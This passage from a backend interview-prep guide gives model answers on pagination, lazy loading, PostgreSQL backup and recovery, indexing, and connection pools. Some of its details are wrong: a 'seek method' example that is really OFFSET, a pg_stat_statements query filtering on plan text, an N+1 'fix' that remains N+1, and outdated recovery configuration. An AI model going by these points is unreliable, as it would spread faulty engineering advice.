    // Add random padding to prevent BREACH
    data._padding = crypto.randomBytes(16).toString('hex');
    
    originalJson.call(this, data);
  };
  
  next();
});

// Or disable compression for sensitive endpoints
app.get('/api/auth/csrf-token', (req, res) => {
  req.headers['x-no-compression'] = '1';  // Disable compression
  res.json({ csrfToken: generateToken() });
});
```

**Interview tip:** Explain the massive bandwidth savings (90% reduction), discuss what to compress (text) vs not compress (images), show compression levels trade-off (speed vs size), and mention pre-compression for static assets."

---

## Q38: Explain pagination strategies (offset vs cursor)

**Perfect Answer:**

"Two main approaches: Offset-based (simpler) and Cursor-based (better performance).

**1. Offset-Based Pagination**
```javascript
// Simple: Page number + page size
app.get('/api/posts', async (req, res) => {
  const page = parseInt(req.query.page) || 1;
  const limit = parseInt(req.query.limit) || 20;
  const offset = (page - 1) * limit;
  
  // Get total count
  const countResult = await db.query('SELECT COUNT(*) FROM posts');
  const total = parseInt(countResult.rows[0].count);
  
  // Get page of data
  const posts = await db.query(`
    SELECT * FROM posts
    ORDER BY created_at DESC
    LIMIT $1 OFFSET $2
  `, [limit, offset]);
  
  res.json({
    data: posts.rows,
    pagination: {
      page,
      limit,
      total,
      pages: Math.ceil(total / limit),
      hasNext: offset + limit < total,
      hasPrev: page > 1
    }
  });
});

// Request: GET /api/posts?page=5&limit=20
// Response:
{
  "data": [...],
  "pagination": {
    "page": 5,
    "limit": 20,
    "total": 1000,
    "pages": 50,
    "hasNext": true,
    "hasPrev": true
  }
}
```

**Problems with offset:**

**Problem 1: Performance degrades with deep pagination**
```sql
-- Page 1 (fast: 5ms)
SELECT * FROM posts ORDER BY created_at DESC LIMIT 20 OFFSET 0;

-- Page 100 (slow: 50ms)
SELECT * FROM posts ORDER BY created_at DESC LIMIT 20 OFFSET 2000;
-- Database scans and discards 2000 rows!

-- Page 5000 (very slow: 500ms)
SELECT * FROM posts ORDER BY created_at DESC LIMIT 20 OFFSET 100000;
-- Database scans and discards 100,000 rows!
```

**Problem 2: Inconsistent results when data changes**
```sql
-- User on page 2 (shows posts 21-40)
SELECT * FROM posts ORDER BY created_at DESC LIMIT 20 OFFSET 20;

-- New post added (pushed everything down)
INSERT INTO posts ...

-- User clicks next to page 3
SELECT * FROM posts ORDER BY created_at DESC LIMIT 20 OFFSET 40;
-- Now sees posts 41-60, but post 21 was pushed to 22
-- User missed seeing post 21! (Skipped data)

-- Or if post deleted:
-- User sees post 40 again on page 3 (Duplicate data)
```

**2. Cursor-Based Pagination (Better)**
```javascript
app.get('/api/posts', async (req, res) => {
  const limit = parseInt(req.query.limit) || 20;
  const cursor = req.query.cursor;  // Last seen post ID
  
  let query = `
    SELECT * FROM posts
    WHERE 1=1
  `;
  
  const params = [limit];
  
  if (cursor) {
    // Get posts after cursor
    query += ` AND id < $2`;
    params.push(cursor);
  }
  
  query += ` ORDER BY id DESC LIMIT $1`;
  
  const posts = await db.query(query, params);
  
  // Next cursor = last post ID
  const nextCursor = posts.rows.length > 0
    ? posts.rows[posts.rows.length - 1].id
    : null;
  
  res.json({
    data: posts.rows,
    pagination: {
      cursor: nextCursor,
      hasMore: posts.rows.length === limit
    }
  });
});

// Request 1: GET /api/posts?limit=20
// Response:
{
  "data": [...],  // Posts with IDs 100-81
  "pagination": {
    "cursor": "81",
    "hasMore": true
  }
}

// Request 2: GET /api/posts?limit=20&cursor=81
// Response:
{
  "data": [...],  // Posts with IDs 80-61
  "pagination": {
    "cursor": "61",
    "hasMore": true
  }
}
```

**Benefits of cursor:**
```
✅ Performance: No OFFSET scanning
   - Page 1: 5ms
   - Page 100: 5ms (still fast!)
   - Page 5000: 5ms (still fast!)

✅ Consistency: No duplicates/skips
   - New posts don't affect cursor position
   - Deleted posts don't affect cursor position

✅ Real-time friendly: Works with infinite scroll
```

**Cursor with timestamp (for time-based ordering):**
```javascript
app.get('/api/posts', async (req, res) => {
  const limit = parseInt(req.query.limit) || 20;
  const cursor = req.query.cursor;  // ISO timestamp
  
  let query = `
    SELECT * FROM posts
    WHERE 1=1
  `;
  
  const params = [limit];
  
  if (cursor) {
    query += ` AND created_at < $2`;
    params.push(cursor);
  }
  
  query += ` ORDER BY created_at DESC LIMIT $1`;
  
  const posts = await db.query(query, params);
  
  const nextCursor = posts.rows.length > 0
    ? posts.rows[posts.rows.length - 1].created_at.toISOString()
    : null;
  
  res.json({
    data: posts.rows,
    pagination: {
      cursor: nextCursor,
      hasMore: posts.rows.length === limit
    }
  });
});
```

**Compound cursor (for ties):**
```javascript
// Problem: Multiple posts with same created_at
// Solution: Use created_at + id

app.get('/api/posts', async (req, res) => {
  const limit = parseInt(req.query.limit) || 20;
  let cursorDate, cursorId;
  
  if (req.query.cursor) {
    [cursorDate, cursorId] = req.query.cursor.split('_');
  }
  
  let query = `SELECT * FROM posts WHERE 1=1`;
  const params = [limit];
  
  if (cursorDate && cursorId) {
    query += ` AND (created_at, id) < ($2, $3)`;
    params.push(cursorDate, cursorId);
  }
  
  query += ` ORDER BY created_at DESC, id DESC LIMIT $1`;
  
  const posts = await db.query(query, params);
  
  const nextCursor = posts.rows.length > 0
    ? `${posts.rows[posts.rows.length - 1].created_at.toISOString()}_${posts.rows[posts.rows.length - 1].id}`
    : null;
  
  res.json({
    data: posts.rows,
    pagination: {
      cursor: nextCursor,
      hasMore: posts.rows.length === limit
    }
  });
});

// Cursor: "2024-01-15T10:30:00.000Z_12345"
```

**3. Hybrid: Offset + Cursor (Best of both)**
```javascript
// Use offset for small pages (1-10)
// Use cursor for deep pagination (11+)

app.get('/api/posts', async (req, res) => {
  const page = parseInt(req.query.page) || 1;
  const limit = parseInt(req.query.limit) || 20;
  const cursor = req.query.cursor;
  
  if (!cursor && page <= 10) {
    // Offset-based for first 10 pages
    const offset = (page - 1) * limit;
    const posts = await db.query(`
      SELECT * FROM posts
      ORDER BY id DESC
      LIMIT $1 OFFSET $2
    `, [limit, offset]);
    
    const nextCursor = posts.rows.length > 0
      ? posts.rows[posts.rows.length - 1].id
      : null;
    
    res.json({
      data: posts.rows,
      pagination: {
        page,
        cursor: nextCursor,
        hasNext: posts.rows.length === limit
      }
    });
  } else {
    // Cursor-based for deep pagination
    const posts = await db.query(`
      SELECT * FROM posts
      WHERE id < $1
      ORDER BY id DESC
      LIMIT $2
    `, [cursor || Number.MAX_SAFE_INTEGER, limit]);
    
    const nextCursor = posts.rows.length > 0
      ? posts.rows[posts.rows.length - 1].id
      : null;
    
    res.json({
      data: posts.rows,
      pagination: {
        cursor: nextCursor,
        hasMore: posts.rows.length === limit
      }
    });
  }
});
```

**4. Seek Method (SQL 2012+)**
```sql
-- Fastest pagination (uses index directly)
-- No OFFSET, no cursor in WHERE clause

SELECT * FROM posts
ORDER BY id DESC
OFFSET 0 ROWS         -- Start position
FETCH NEXT 20 ROWS ONLY;  -- Page size

-- Page 2
SELECT * FROM posts
ORDER BY id DESC
OFFSET 20 ROWS
FETCH NEXT 20 ROWS ONLY;

-- Still suffers from offset problem for deep pagination
-- But syntax cleaner than LIMIT/OFFSET
```

**Comparison:**

| Feature | Offset | Cursor | Hybrid |
|---------|--------|--------|--------|
| Simplicity | ✅ Simple | ⚠️ Complex | ⚠️ Complex |
| Performance (page 1) | ✅ Fast | ✅ Fast | ✅ Fast |
| Performance (page 1000) | ❌ Slow | ✅ Fast | ✅ Fast |
| Jump to page | ✅ Yes | ❌ No | ✅ Yes (first 10) |
| Consistency | ❌ Can skip/duplicate | ✅ Consistent | ✅ Consistent |
| Total count | ✅ Easy | ❌ Hard | ⚠️ For first 10 pages |
| Use case | Simple lists | Infinite scroll | Large datasets |

**Interview tip:** Explain offset problems (slow for deep pages, inconsistent when data changes), show cursor approach fixes both issues, mention compound cursor for ties, and discuss hybrid approach for best of both worlds."

---

## Q39: How do you implement lazy loading for better performance?

**Perfect Answer:**

"Lazy loading defers loading resources until they're needed, improving initial page load time.

**1. Image Lazy Loading (Native)**
```html
<!-- Browser handles lazy loading -->
<img src="product.jpg" loading="lazy" alt="Product">

<!-- Only loads when image enters viewport -->
```

**2. Component Lazy Loading (React)**
```javascript
import React, { lazy, Suspense } from 'react';

// Lazy load components
const HeavyComponent = lazy(() => import('./HeavyComponent'));
const AdminPanel = lazy(() => import('./AdminPanel'));

function App() {
  return (
    <Suspense fallback={<div>Loading...</div>}>
      {/* Only loaded when rendered */}
      <HeavyComponent />
    </Suspense>
  );
}

// Code splitting: HeavyComponent bundle loaded separately
// Initial bundle: 100KB (without HeavyComponent)
// HeavyComponent bundle: 50KB (loaded on demand)
```

**3. Route-Based Code Splitting**
```javascript
import { lazy } from 'react';
import { BrowserRouter, Routes, Route } from 'react-router-dom';

// Split code by route
const Home = lazy(() => import('./pages/Home'));
const Dashboard = lazy(() => import('./pages/Dashboard'));
const Admin = lazy(() => import('./pages/Admin'));

function App() {
  return (
    <BrowserRouter>
      <Suspense fallback={<LoadingSpinner />}>
        <Routes>
          <Route path="/" element={<Home />} />
          <Route path="/dashboard" element={<Dashboard />} />
          <Route path="/admin" element={<Admin />} />
        </Routes>
      </Suspense>
    </BrowserRouter>
  );
}

// Each route has separate bundle
// User only downloads routes they visit
```

**4. Infinite Scroll (Backend)**
```javascript
app.get('/api/posts', async (req, res) => {
  const page = parseInt(req.query.page) || 1;
  const limit = 20;
  const offset = (page - 1) * limit;
  
  const posts = await db.query(`
    SELECT * FROM posts
    ORDER BY created_at DESC
    LIMIT $1 OFFSET $2
  `, [limit, offset]);
  
  res.json({
    posts: posts.rows,
    page,
    hasMore: posts.rows.length === limit
  });
});

// Frontend loads more as user scrolls
```

**5. Intersection Observer (Efficient scroll detection)**
```javascript
// Load content when element enters viewport
const observer = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      // Element is visible, load content
      loadMorePosts();
      observer.unobserve(entry.target);
    }
  });
});

// Observe the "load more" trigger element
const loadMoreTrigger = document.getElementById('load-more');
observer.observe(loadMoreTrigger);

async function loadMorePosts() {
  const response = await fetch(`/api/posts?page=${currentPage}`);
  const data = await response.json();
  
  // Append posts to DOM
  renderPosts(data.posts);
  currentPage++;
}
```

**6. Database Query Lazy Loading (N+1 solution)**
```javascript
// ❌ BAD: Eager load all comments
const posts = await db.query('SELECT * FROM posts');
for (const post of posts.rows) {
  const comments = await db.query('SELECT * FROM comments WHERE post_id = $1', [post.id]);
  post.comments = comments.rows;
}

// ✅ GOOD: Lazy load comments on demand
class Post {
  constructor(data) {
    this.id = data.id;
    this.title = data.title;
    this._comments = null;
  }
  
  async getComments() {
    if (!this._comments) {
      const result = await db.query('SELECT * FROM comments WHERE post_id = $1', [this.id]);
      this._comments = result.rows;
    }
    return this._comments;
  }
}

// Only loads comments when post.getComments() is called
```

**7. Prefetching (Anticipatory loading)**
```javascript
// Prefetch next page while user views current page
async function prefetchNextPage() {
  const nextPage = currentPage + 1;
  
  // Fetch in background
  const response = await fetch(`/api/posts?page=${nextPage}`);
  const data = await response.json();
  
  // Cache in memory
  pageCache.set(nextPage, data);
}

// Prefetch on page load
window.addEventListener('load', () => {
  setTimeout(prefetchNextPage, 1000);  // After 1 second
});

// When user scrolls, data already cached
async function loadMorePosts() {
  const cached = pageCache.get(currentPage);
  
  if (cached) {
    renderPosts(cached.posts);  // Instant!
  } else {
    const response = await fetch(`/api/posts?page=${currentPage}`);
    const data = await response.json();
    renderPosts(data.posts);
  }
  
  currentPage++;
  prefetchNextPage();  // Prefetch next
}
```

**8. Bundle Splitting (Webpack)**
```javascript
// webpack.config.js
module.exports = {
  optimization: {
    splitChunks: {
      chunks: 'all',
      cacheGroups: {
        // Vendor bundle (libraries)
        vendor: {
          test: /[\\/]node_modules[\\/]/,
          name: 'vendors',
          priority: 10
        },
        // Common code
        common: {
          minChunks: 2,
          name: 'common',
          priority: 5
        }
      }
    }
  }
};

// Output:
// main.js (your code): 50KB
// vendors.js (libraries): 200KB
// common.js (shared code): 30KB
// route-home.js: 20KB
// route-admin.js: 40KB

// User only loads what they need
```

**9. Progressive Enhancement**
```javascript
// Load critical content first, then enhance
async function loadPage() {
  // Phase 1: Critical content (SSR or inline)
  renderCriticalContent();
  
  // Phase 2: Above-the-fold images
  await loadVisibleImages();
  
  // Phase 3: Interactive features
  await loadJavaScript();
  
  // Phase 4: Below-the-fold content
  await loadRemainingContent();
  
  // Phase 5: Analytics, ads, etc.
  await loadNonEssential();
}

// User sees content quickly, functionality loads progressively
```

**10. API Response Lazy Loading**
```javascript
// Return minimal data initially, full data on demand
app.get('/api/posts', async (req, res) => {
  const posts = await db.query(`
    SELECT id, title, excerpt, created_at
    FROM posts
    ORDER BY created_at DESC
    LIMIT 20
  `);
  // NOT including body (large text)
  
  res.json(posts.rows);
});

app.get('/api/posts/:id', async (req, res) => {
  const post = await db.query(`
    SELECT * FROM posts WHERE id = $1
  `, [req.params.id]);
  // NOW include body
  
  res.json(post.rows[0]);
});

// List view: Fast (no body)
// Detail view: Full data
```

**Performance Impact:**
```
Without lazy loading:
- Initial bundle: 800KB
- Load time: 3.5 seconds
- Time to interactive: 5 seconds

With lazy loading:
- Initial bundle: 150KB (critical code)
- Load time: 0.8 seconds (4.4× faster!)
- Time to interactive: 1.2 seconds (4.2× faster!)
- Additional bundles loaded on demand
```

**Interview tip:** Show multiple lazy loading techniques (images, code splitting, infinite scroll, prefetching), explain the performance impact with numbers (800KB → 150KB initial bundle), and discuss progressive enhancement for better user experience."

---

## Q40: How do you implement database backup and recovery?

**Perfect Answer:**

"Multi-layered backup strategy: logical dumps, physical backups, WAL archiving, and PITR.

**1. Logical Backup (pg_dump)**
```bash
# Full database backup
pg_dump -h localhost -U postgres mydb > backup.sql

# With compression (90% smaller)
pg_dump -h localhost -U postgres mydb | gzip > backup.sql.gz

# Directory format (parallel dump, faster)
pg_dump -h localhost -U postgres -F d -j 4 mydb -f backup_dir/

# Specific tables only
pg_dump -h localhost -U postgres -t users -t orders mydb > backup_tables.sql

# Exclude data from large tables (schema only)
pg_dump -h localhost -U postgres --schema-only -t logs mydb > schema.sql
```

**2. Automated Backup Script (Node.js)**
```javascript
const { exec } = require('child_process');
const { promisify } = require('util');
const execAsync = promisify(exec);

async function createBackup() {
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
  const filename = `backup-${timestamp}.sql.gz`;
  const backupPath = `/backups/${filename}`;
  
  try {
    logger.info('Starting database backup', { filename });
    
    // Create backup
    await execAsync(
      `pg_dump -h ${process.env.DB_HOST} -U ${process.env.DB_USER} ${process.env.DB_NAME} | gzip > ${backupPath}`,
      { env: { PGPASSWORD: process.env.DB_PASSWORD } }
    );
    
    // Get file size
    const { stdout } = await execAsync(`du -h ${backupPath}`);
    const size = stdout.split('\t')[0];
    
    logger.info('Backup completed', { filename, size });
    
    // Upload to S3
    await uploadToS3(backupPath, filename);
    
    // Delete old local backup
    await execAsync(`rm ${backupPath}`);
    
    // Cleanup old S3 backups (keep last 30 days)
    await cleanupOldBackups(30);
    
    return { filename, size };
  } catch (error) {
    logger.error('Backup failed', { error: error.message });
    
    // Alert ops team
    await sendAlert({
      type: 'backup-failure',
      message: `Database backup failed: ${error.message}`
    });
    
    throw error;
  }
}

// Schedule daily backups at 2 AM
const cron = require('node-cron');
cron.schedule('0 2 * * *', createBackup);
```

**3. Continuous Archiving (WAL)**
```bash
# postgresql.conf
wal_level = replica
archive_mode = on
archive_command = 'cp %p /archive/%f'

# Or archive to S3
archive_command = 'aws s3 cp %p s3://my-bucket/wal-archive/%f'

# WAL segments continuously archived
# Allows point-in-time recovery (PITR)
```

**4. Point-in-Time Recovery (PITR)**
```bash
# Scenario: Oops, dropped table at 14:30
# Need to restore to 14:29:59

# Step 1: Stop database
systemctl stop postgresql

# Step 2: Restore base backup
rm -rf /var/lib/postgresql/data/*
tar -xzf base_backup.tar.gz -C /var/lib/postgresql/data/

# Step 3: Create recovery configuration
cat > /var/lib/postgresql/data/recovery.conf <<EOF
restore_command = 'cp /archive/%f %p'
recovery_target_time = '2024-01-15 14:29:59'
recovery_target_action = 'promote'
EOF

# Step 4: Start database (applies WAL up to target time)
systemctl start postgresql

# Database restored to 14:29:59, table still exists!
```

**5. Physical Backup (pg_basebackup)**
```bash
# Faster for large databases, allows PITR
pg_basebackup -h localhost -U replication -D /backup/base -Fp -Xs -P

# -Fp: Plain format
# -Xs: Include WAL in backup
# -P: Show progress

# Backup includes entire data directory
# Can restore and replay WAL for PITR
```

**6. Backup Verification**
```javascript
async function verifyBackup(backupFile) {
  try {
    logger.info('Verifying backup', { backupFile });
    
    // Create test database
    await execAsync(`createdb -U postgres test_restore`);
    
    // Restore backup
    await execAsync(`gunzip -c ${backupFile} | psql -U postgres test_restore`);
    
    // Verify table counts
    const { stdout } = await execAsync(`
      psql -U postgres test_restore -t -c "
        SELECT COUNT(*) FROM users;
        SELECT COUNT(*) FROM orders;
        SELECT COUNT(*) FROM products;
      "
    `);
    
    const counts = stdout.trim().split('\n').map(Number);
    
    logger.info('Backup verification passed', {
      users: counts[0],
      orders: counts[1],
      products: counts[2]
    });
    
    // Drop test database
    await execAsync(`dropdb -U postgres test_restore`);
    
    return true;
  } catch (error) {
    logger.error('Backup verification failed', { error: error.message });
    
    await sendAlert({
      type: 'backup-verification-failure',
      message: `Backup ${backupFile} is corrupted`
    });
    
    return false;
  }
}

// Verify backups weekly
cron.schedule('0 3 * * 0', async () => {
  const latestBackup = await getLatestBackup();
  await verifyBackup(latestBackup);
});
```

**7. 3-2-1 Backup Rule**
```
3 copies of data:
- Production database
- Local backup
- Remote backup (S3)

2 different media:
- Disk (local backup)
- Cloud storage (S3)

1 offsite:
- S3 in different region
- Or different cloud provider
```

**8. Backup Retention Policy**
```javascript
async function cleanupOldBackups(daysToKeep) {
  const cutoffDate = new Date();
  cutoffDate.setDate(cutoffDate.getDate() - daysToKeep);
  
  // List S3 backups
  const backups = await s3.listObjects({
    Bucket: 'my-backups',
    Prefix: 'backup-'
  });
  
  // Delete old backups
  const toDelete = backups.Contents.filter(obj => {
    return new Date(obj.LastModified) < cutoffDate;
  });
  
  for (const obj of toDelete) {
    await s3.deleteObject({
      Bucket: 'my-backups',
      Key: obj.Key
    });
    
    logger.info('Deleted old backup', { key: obj.Key });
  }
  
  logger.info('Cleanup completed', { deleted: toDelete.length });
}

// Retention strategy:
// - Daily backups: Keep 7 days
// - Weekly backups: Keep 4 weeks
// - Monthly backups: Keep 12 months
```

**9. Disaster Recovery Plan**
```javascript
// disaster-recovery-runbook.md

## Database Recovery Procedure

### Scenario 1: Full Database Loss
1. Create new database instance
2. Restore latest base backup
3. Apply WAL files for PITR
4. Update connection strings
5. Verify data integrity
6. Resume operations

Estimated Recovery Time: 2 hours

### Scenario 2: Accidental Data Deletion
1. Identify deletion timestamp
2. Restore to point before deletion
3. Export affected data
4. Import to production
5. Verify data correctness

Estimated Recovery Time: 30 minutes

### Scenario 3: Corruption
1. Stop accepting writes
2. Restore from last verified backup
3. Replay WAL to latest point
4. Run integrity checks
5. Resume operations

Estimated Recovery Time: 1 hour
```

**10. Monitoring Backup Health**
```javascript
// Check backup status
async function checkBackupHealth() {
  const checks = {
    lastBackup: null,
    backupAge: null,
    backupSize: null,
    verification: null
  };
  
  // Get latest backup
  const backups = await s3.listObjects({
    Bucket: 'my-backups',
    Prefix: 'backup-'
  });
  
  if (backups.Contents.length === 0) {
    await sendAlert({
      type: 'no-backups',
      message: 'No database backups found!'
    });
    return checks;
  }
  
  const latest = backups.Contents.sort((a, b) => 
    new Date(b.LastModified) - new Date(a.LastModified)
  )[0];
  
  checks.lastBackup = latest.LastModified;
  checks.backupAge = (Date.now() - new Date(latest.LastModified)) / (1000 * 60 * 60);  // hours
  checks.backupSize = (latest.Size / (1024 * 1024)).toFixed(2) + ' MB';
  
  // Alert if backup > 24 hours old
  if (checks.backupAge > 24) {
    await sendAlert({
      type: 'stale-backup',
      message: `Latest backup is ${checks.backupAge.toFixed(1)} hours old`
    });
  }
  
  return checks;
}

// Check every hour
cron.schedule('0 * * * *', checkBackupHealth);
```

**Recovery Time Objectives:**
```
RTO (Recovery Time Objective): Maximum downtime
- Critical: < 1 hour
- Important: < 4 hours
- Normal: < 24 hours

RPO (Recovery Point Objective): Maximum data loss
- Critical: < 5 minutes (continuous WAL)
- Important: < 1 hour (hourly backups)
- Normal: < 24 hours (daily backups)
```

**Interview tip:** Explain multiple backup strategies (pg_dump, physical backups, WAL archiving, PITR), show automated backup scripts with verification, discuss 3-2-1 backup rule, and mention disaster recovery procedures with RTO/RPO targets."

---

## Q41: When do you use database indexes and when NOT to?

**Perfect Answer:**

"Indexes speed up reads but slow down writes. Use strategically.

**When TO use indexes:**

**1. WHERE clauses (Most common)**
```sql
-- Query without index: Seq Scan (150ms)
SELECT * FROM users WHERE email = 'john@example.com';

-- Add index
CREATE INDEX idx_users_email ON users(email);

-- Query with index: Index Scan (0.5ms) - 300× faster!
```

**2. Foreign keys (JOINs)**
```sql
-- Query without index: Slow JOIN (500ms)
SELECT orders.*, users.name
FROM orders
JOIN users ON orders.user_id = users.id;

-- Add index
CREATE INDEX idx_orders_user_id ON orders(user_id);

-- Query with index: Fast JOIN (50ms) - 10× faster!
```

**3. ORDER BY columns**
```sql
-- Query without index: Sort entire table (1000ms)
SELECT * FROM posts ORDER BY created_at DESC LIMIT 20;

-- Add index
CREATE INDEX idx_posts_created_at ON posts(created_at DESC);

-- Query with index: Index Scan (10ms) - 100× faster!
```

**4. Composite index for multiple columns**
```sql
-- Query uses both columns
SELECT * FROM orders
WHERE user_id = 123 AND status = 'pending'
ORDER BY created_at DESC;

-- Composite index (order matters!)
CREATE INDEX idx_orders_user_status_created ON orders(user_id, status, created_at DESC);

-- Can use this index for:
-- - user_id alone
-- - user_id + status
-- - user_id + status + created_at
-- CANNOT use for status alone!
```

**5. Covering index (includes all queried columns)**
```sql
-- Query
SELECT id, title, status, created_at
FROM posts
WHERE user_id = 123
ORDER BY created_at DESC;

-- Covering index (includes all columns)
CREATE INDEX idx_posts_covering ON posts(user_id, created_at DESC, id, title, status);

-- Database doesn't need to access table at all!
-- Everything in index (Index-Only Scan)
```

**When NOT to use indexes:**

**1. Small tables (< 1000 rows)**
```sql
-- Table: 100 rows
-- Sequential scan: 5ms
-- Index scan: 3ms + index maintenance overhead

-- Not worth it!
```

**2. Low cardinality (few distinct values)**
```sql
-- Bad: Boolean column (only 2 values)
CREATE INDEX idx_users_active ON users(active);  -- ❌ Don't create

-- If 50% of users active, index won't help
-- Database will scan half the table anyway

-- Exception: If 99% true, 1% false, then index helps for false
CREATE INDEX idx_users_inactive ON users(active) WHERE active = false;
```

**3. Columns updated frequently**
```sql
-- Table: user_sessions
-- Column: last_seen (updated every request)

CREATE INDEX idx_sessions_last_seen ON user_sessions(last_seen);  -- ❌ Bad

-- Every update must update index
-- Write performance degraded
-- High index maintenance overhead
```

**4. Full table scans are common**
```sql
-- Analytics query scans all data
SELECT DATE(created_at), COUNT(*)
FROM orders
GROUP BY DATE(created_at);

-- Index won't help (scanning entire table anyway)
```

**5. Blob/text columns**
```sql
-- Don't index large text
CREATE INDEX idx_posts_body ON posts(body);  -- ❌ Bad

-- Index would be huge
-- Use full-text search instead:
CREATE INDEX idx_posts_body_fts ON posts USING gin(to_tsvector('english', body));
```

**Index Types:**

**B-tree (Default, 99% of cases)**
```sql
CREATE INDEX idx_users_email ON users(email);  -- B-tree

-- Use for: =, <, >, <=, >=, BETWEEN, LIKE 'abc%'
-- Cannot use for: LIKE '%abc%' (leading wildcard)
```

**Hash (Only for equality)**
```sql
CREATE INDEX idx_users_email ON users USING hash(email);

-- Use for: = only
-- Smaller than B-tree
-- Rarely needed (B-tree handles equality well)
```

**GIN (Full-text search, arrays)**
```sql
-- Full-text search
CREATE INDEX idx_posts_search ON posts USING gin(to_tsvector('english', body));

SELECT * FROM posts WHERE to_tsvector('english', body) @@ to_tsquery('postgresql');

-- Arrays
CREATE INDEX idx_users_tags ON users USING gin(tags);

SELECT * FROM users WHERE tags @> ARRAY['nodejs', 'redis'];
```

**Partial index (Condition-specific)**
```sql
-- Only index active users
CREATE INDEX idx_users_active_email ON users(email) WHERE active = true;

-- Smaller index (90% of users active)
-- Faster queries for active users
-- No overhead for inactive users
```

**Monitoring indexes:**

**1. Unused indexes (waste space, slow writes)**
```sql
SELECT
  schemaname,
  tablename,
  indexname,
  idx_scan AS scans,
  pg_size_pretty(pg_relation_size(indexrelid)) AS size
FROM pg_stat_user_indexes
WHERE idx_scan = 0  -- Never used
  AND indexrelid NOT IN (
    SELECT indexrelid FROM pg_index WHERE indisunique  -- Keep unique indexes
  )
ORDER BY pg_relation_size(indexrelid) DESC;

-- Drop unused indexes
DROP INDEX idx_never_used;
```

**2. Missing indexes (slow queries)**
```sql
-- Find queries not using indexes
SELECT
  query,
  calls,
  total_time,
  mean_time,
  rows
FROM pg_stat_statements
WHERE query LIKE '%Seq Scan%'  -- Sequential scan
ORDER BY total_time DESC
LIMIT 10;

-- Add indexes for these queries
```

**3. Index bloat (rebuild needed)**
```sql
-- Check index bloat
SELECT
  tablename,
  indexname,
  pg_size_pretty(pg_relation_size(indexrelid)) AS size
FROM pg_stat_user_indexes
ORDER BY pg_relation_size(indexrelid) DESC;

-- Rebuild bloated index
REINDEX INDEX idx_users_email;

-- Or rebuild all table indexes
REINDEX TABLE users;
```

**Index size limit:**
```
PostgreSQL: 8KB per index entry
- Don't index columns > 2KB
- Use partial indexes
- Use expression indexes for hashed values

-- Example: Hash long URLs
CREATE INDEX idx_urls_hash ON urls(md5(url));
SELECT * FROM urls WHERE md5(url) = md5('https://example.com/very/long/url');
```

**Cost calculation:**
```
Table: 1M rows
Index size: 50MB
Write frequency: 1000 writes/sec

Without index:
- Read: 500ms (seq scan)
- Write: 5ms

With index:
- Read: 2ms (index scan) - 250× faster! ✅
- Write: 8ms (update index too) - 60% slower ❌

Trade-off: Worth it if reads >> writes (90%+ reads)
```

**Interview tip:** Explain when to add indexes (WHERE, JOIN, ORDER BY) vs when NOT to (small tables, low cardinality, frequent updates), show index types (B-tree, GIN, partial), discuss monitoring for unused/missing indexes, and mention the read/write trade-off."

---

## Q42: How do you detect and prevent connection pool exhaustion?

**Perfect Answer:**

"Connection pool exhaustion happens when all connections are in use and new requests must wait. Causes cascading failures.

**Symptoms:**
```javascript
// Error messages:
Error: Connection timeout
Error: Pool is full
Error: Unable to acquire connection
Error: All connections in use

// Performance:
- Requests hanging
- Timeouts increasing
- Response time spikes
- Database CPU low (not the problem)
- Application CPU low (waiting for connections)
```

**Root Causes:**

**1. Connection Leaks (Not releasing)**
```javascript
// ❌ BAD: Connection never released
async function getUser(id) {
  const client = await pool.connect();
  const result = await client.query('SELECT * FROM users WHERE id = $1', [id]);
  return result.rows[0];
  // BUG: Never called client.release()!
}

// After 20 requests, pool exhausted (max: 20)

// ✅ GOOD: Always release
async function getUser(id) {
  const client = await pool.connect();
  try {
    const result = await client.query('SELECT * FROM users WHERE id = $1', [id]);
    return result.rows[0];
  } finally {
    client.release();  // Always release
  }
}

// Even better: Use pool.query (auto-releases)
async function getUser(id) {
  const result = await pool.query('SELECT * FROM users WHERE id = $1', [id]);
  return result.rows[0];
}
```

**2. Long-running queries**
```javascript
// ❌ BAD: Query takes 30 seconds
async function generateReport() {
  const client = await pool.connect();
  
  // Complex query, holds connection for 30s
  const result = await client.query(`
    SELECT ... complex joins ... GROUP BY ... ORDER BY ...
  `);
  
  client.release();
  return result.rows;
}

// If 20 reports running simultaneously, pool exhausted

// ✅ GOOD: Dedicated pool for long queries
const analyticsPool = new Pool({
  ...config,
  max: 5  // Separate pool for analytics
});

async function generateReport() {
  const result = await analyticsPool.query(`
    SELECT ... complex query ...
  `);
  return result.rows;
}
```

**3. Traffic spikes**
```javascript
// Normal traffic: 50 req/sec (10 connections sufficient)
// Spike: 500 req/sec (need 100 connections)

// Pool: max 20 connections
// Result: 80 requests wait, timeouts occur

// ✅ Solution 1: Increase pool size
const pool = new Pool({
  max: 50  // Handle spikes
});

// ✅ Solution 2: Queue with timeout
const pool = new Pool({
  max: 20,
  connectionTimeoutMillis: 2000  // Fail fast after 2s
});

// ✅ Solution 3: Rate limiting
app.use(rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100  // Limit requests per IP
}));
```

**Detection:**

**1. Monitor pool metrics**
```javascript
const poolStats = {
  total: 0,
  idle: 0,
  waiting: 0
};

setInterval(() => {
  poolStats.total = pool.totalCount;
  poolStats.idle = pool.idleCount;
  poolStats.waiting = pool.waitingCount;
  
  logger.info('Pool stats', poolStats);
  
  // Alert if pool under pressure
  if (poolStats.waiting > 10) {
    logger.error('Connection pool exhausted', poolStats);
    
    sendAlert({
      type: 'pool-exhaustion',
      message: `${poolStats.waiting} requests waiting for connections`,
      stats: poolStats
    });
  }
  
  // Alert if high utilization
  const utilization = (poolStats.total - poolStats.idle) / pool.options.max;
  if (utilization > 0.8) {
    logger.warn('Pool utilization high', {
      utilization: `${(utilization * 100).toFixed(1)}%`,
      stats: poolStats
    });
  }
}, 10000);  // Check every 10 seconds
```

**2. Connection leak detection**
```javascript
// Track connection acquisition/release
const activeConnections = new Map();

const originalConnect = pool.connect.bind(pool);
pool.connect = async function() {
  const client = await originalConnect();
  
  // Record acquisition
  const stack = new Error().stack;
  const timestamp = Date.now();
  activeConnections.set(client, { stack, timestamp });
  
  // Wrap release
  const originalRelease = client.release.bind(client);
  client.release = function() {
    activeConnections.delete(client);
    return originalRelease();
  };
  
  return client;
};

// Check for leaks every minute
setInterval(() => {
  const now = Date.now();
  const leaks = [];
  
  for (const [client, info] of activeConnections) {
    const age = now - info.timestamp;
    
    if (age > 30000) {  // Held > 30 seconds
      leaks.push({
        age,
        stack: info.stack
      });
    }
  }
  
  if (leaks.length > 0) {
